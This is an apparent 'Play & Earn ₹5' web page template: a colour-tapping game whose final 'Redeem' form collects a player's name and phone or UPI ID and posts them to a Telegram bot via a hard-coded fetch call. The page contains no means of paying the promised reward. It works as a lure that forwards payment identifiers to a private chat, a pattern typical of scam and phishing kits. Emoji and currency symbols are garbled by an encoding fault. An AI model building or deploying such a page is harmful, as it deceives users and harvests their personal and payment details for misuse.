<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Play & Earn ‚Çπ5</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #e0f7fa;
      text-align: center;
    }
    header {
      background: #006064;
      color: white;
      padding: 20px;
    }
    #banner {
      background: url('https://via.placeholder.com/400x200?text=Play+Color+Game+%26+Earn+%E2%82%B95');
      background-size: cover;
      height: 200px;
      position: relative;
    }
    #start-button {
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #00796b;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
    }
    .color-btn {
      padding: 40px;
      margin: 10px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      color: white;
      font-weight: bold;
      transition: transform 0.2s;
    }
    .color-btn:active {
      transform: scale(0.95);
    }
    #status, #timer, #target, #banned, #word-test, #finish {
      margin-top: 20px;
      font-size: 18px;
    }
    #next-btn, #redeem-btn {
      margin-top: 20px;
      padding: 10px 20px;
      background: #00695c;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 18px;
    }
    #game-container {
      display: none;
    }
    #form-section {
      display: none;
      padding: 20px;
    }
    input {
      padding: 10px;
      width: 80%;
      margin: 10px auto;
      font-size: 16px;
      border-radius: 6px;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>

<header>
  <h1>üéÆ Play This Game & Earn ‚Çπ5</h1>
</header>

<div id="banner">
  <button id="start-button" onclick="startGame()">Start Game</button>
</div>

<div id="game-container">
  <h2 id="stage-title">Color Tap Challenge</h2>
  <div id="game-area"></div>
  <div id="target"></div>
  <div id="timer"></div>
  <div id="banned"></div>
  <div id="word-test"></div>
  <div id="status"></div>
  <div id="finish" style="display:none; font-size:22px; color:green;">üéâ You completed all 5 stages and earned ‚Çπ5!</div>
  <button id="next-btn" onclick="nextStage()">Next Stage</button>
  <button id="redeem-btn" onclick="showRedeemForm()">üéÅ Redeem ‚Çπ5</button>
</div>

<div id="form-section">
  <h2>üéÅ Enter Details to Redeem</h2>
  <input type="text" id="name" placeholder="Your Name" />
  <input type="text" id="number" placeholder="Phone or UPI ID" />
  <button onclick="sendToTelegram()">Send</button>
</div>

<script>
const colors = ['RED', 'GREEN', 'BLUE', 'YELLOW'];
const colorHex = {
  RED: '#f44336',
  GREEN: '#4caf50',
  BLUE: '#2196f3',
  YELLOW: '#ffeb3b'
};

let stage = 1;
let score = 0;
let timer, correctColor, bannedColor, correctAnswer;
let currentRound = 0;

function startGame() {
  document.getElementById('banner').style.display = 'none';
  document.getElementById('game-container').style.display = 'block';
  startStage();
}

function resetGame(msg) {
  alert(msg);
  stage = 1;
  score = 0;
  currentRound = 0;
  startStage();
}

function nextStage() {
  stage++;
  score = 0;
  startStage();
}

function startStage() {
  document.getElementById('status').textContent = '';
  document.getElementById('timer').textContent = '';
  document.getElementById('banned').textContent = '';
  document.getElementById('word-test').textContent = '';
  document.getElementById('target').textContent = '';
  document.getElementById('game-area').innerHTML = '';
  document.getElementById('next-btn').style.display = 'none';
  document.getElementById('redeem-btn').style.display = 'none';

  switch(stage) {
    case 1:
      document.getElementById('stage-title').textContent = 'Stage 1: Tap the Correct Color';
      loadColorTap(); break;
    case 2:
      document.getElementById('stage-title').textContent = 'Stage 2: Tap Fast!';
      loadTimedTap(); break;
    case 3:
      document.getElementById('stage-title').textContent = 'Stage 3: Avoid Banned Color';
      loadAvoidTap(); break;
    case 4:
      document.getElementById('stage-title').textContent = 'Stage 4: Tap the TEXT COLOR';
      loadStroopTest(); break;
    case 5:
      document.getElementById('stage-title').textContent = 'Stage 5: Tap 50 Times to Win';
      currentRound = 0;
      loadFinalChallenge(); break;
    default:
      document.getElementById('finish').style.display = 'block';
      document.getElementById('redeem-btn').style.display = 'inline-block';
  }
}

function loadColorTap() {
  correctColor = colors[Math.floor(Math.random() * colors.length)];
  document.getElementById('target').textContent = `Tap: ${correctColor}`;
  loadButtons(color => checkColorTap(color, correctColor, 5));
}

function loadTimedTap() {
  correctColor = colors[Math.floor(Math.random() * colors.length)];
  document.getElementById('target').textContent = `Tap: ${correctColor}`;
  let timeLeft = 5;
  document.getElementById('timer').textContent = `‚è± ${timeLeft}s`;
  timer = setInterval(() => {
    timeLeft--;
    document.getElementById('timer').textContent = `‚è± ${timeLeft}s`;
    if (timeLeft <= 0) {
      clearInterval(timer);
      resetGame('‚è∞ Too Slow! Back to Stage 1');
    }
  }, 1000);
  loadButtons(color => {
    clearInterval(timer);
    checkColorTap(color, correctColor, 5);
  });
}

function loadAvoidTap() {
  bannedColor = colors[Math.floor(Math.random() * colors.length)];
  document.getElementById('banned').textContent = `‚ùå Don‚Äôt tap: ${bannedColor}`;
  loadButtons(color => {
    if (color === bannedColor) resetGame('You tapped the banned color!');
    else checkColorTap(color, 'safe', 5);
  });
}

function loadStroopTest() {
  const word = colors[Math.floor(Math.random() * colors.length)];
  const color = colors[Math.floor(Math.random() * colors.length)];
  correctAnswer = color;
  const wordTest = document.getElementById('word-test');
  wordTest.textContent = word;
  wordTest.style.color = colorHex[color];
  loadButtons(color => {
    if (color === correctAnswer) checkColorTap(color, correctAnswer, 5);
    else resetGame('‚ùå Wrong color! Back to Stage 1');
  });
}

function loadFinalChallenge() {
  document.getElementById('target').textContent = `Tap RED button 50 times to earn ‚Çπ5!`;
  let tapCount = 0;
  const area = document.getElementById('game-area');
  area.innerHTML = '';
  const redBtn = document.createElement('button');
  redBtn.className = 'color-btn';
  redBtn.style.backgroundColor = colorHex.RED;
  redBtn.textContent = 'RED';
  redBtn.onclick = () => {
    tapCount++;
    document.getElementById('status').textContent = `‚úÖ (${tapCount}/50)`;
    if (tapCount >= 50) {
      document.getElementById('finish').style.display = 'block';
      document.getElementById('redeem-btn').style.display = 'inline-block';
    }
  };
  area.appendChild(redBtn);
}

function checkColorTap(tapped, expected, required) {
  if (expected === 'safe' || tapped === expected) {
    score++;
    document.getElementById('status').textContent = `‚úÖ (${score}/${required})`;
    if (score >= required) {
      document.getElementById('next-btn').style.display = 'inline-block';
    } else {
      setTimeout(startStage, 800);
    }
  } else {
    resetGame('‚ùå Wrong tap! Back to Stage 1');
  }
}

function loadButtons(callback) {
  const area = document.getElementById('game-area');
  area.innerHTML = '';
  const shuffled = [...colors].sort(() => 0.5 - Math.random());
  shuffled.forEach(c => {
    const btn = document.createElement('button');
    btn.className = 'color-btn';
    btn.style.backgroundColor = colorHex[c];
    btn.textContent = c;
    btn.onclick = () => callback(c);
    area.appendChild(btn);
  });
}

function showRedeemForm() {
  document.getElementById('form-section').style.display = 'block';
  window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
}

function sendToTelegram() {
  const name = document.getElementById('name').value.trim();
  const number = document.getElementById('number').value.trim();
  if (!name || !number) return alert('Please enter your name and number.');
  const message = `New Game Redeem:\nName: ${name}\nContact: ${number}`;
  const botToken = 'YOUR_BOT_TOKEN';
  const chatId = 'YOUR_CHAT_ID';
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: message })
  })
    .then(res => res.ok ? alert('‚úÖ Sent to Telegram!') : alert('‚ùå Failed to send'));
}
</script>

</body>
</html>
